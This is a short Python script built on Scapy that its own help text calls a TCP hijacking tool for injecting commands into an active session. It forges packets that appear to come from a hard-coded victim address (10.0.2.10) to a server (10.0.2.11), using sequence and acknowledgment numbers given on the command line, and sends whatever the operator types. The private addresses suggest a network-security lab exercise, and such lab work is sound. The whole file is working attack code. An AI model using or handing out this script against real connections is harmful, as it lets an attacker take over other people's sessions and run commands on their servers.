from scapy.all import *
import argparse

victimIP = "10.0.2.10"
serverIP = "10.0.2.11"

def getUserInput():
    parser = argparse.ArgumentParser(description="TCP Hijacking Script for injecting commands into an active session.")
    parser.add_argument("-p", "--victim-port", required=True, type=int, help="Victim's port number")
    parser.add_argument("-q", "--server-port", required=True, type=int, help="Server's port number")
    parser.add_argument("-S", "--seq-num", required=True, type=int, help="TCP sequence number")
    parser.add_argument("-A", "--ack-num", required=True, type=int, help="TCP acknowledgment number")

    args = parser.parse_args()
    return args

args = getUserInput()
ipLayer = IP(src=victimIP, dst=serverIP)
tcpLayer = TCP(sport=args.victim_port, dport=args.server_port, seq=args.seq_num, ack=args.ack_num, flags="PA")
while True:
    payload =input(">>>")
    if payload == "exit":
        break
    payload += "\n"

    packet = ipLayer/tcpLayer/payload
    send(packet)
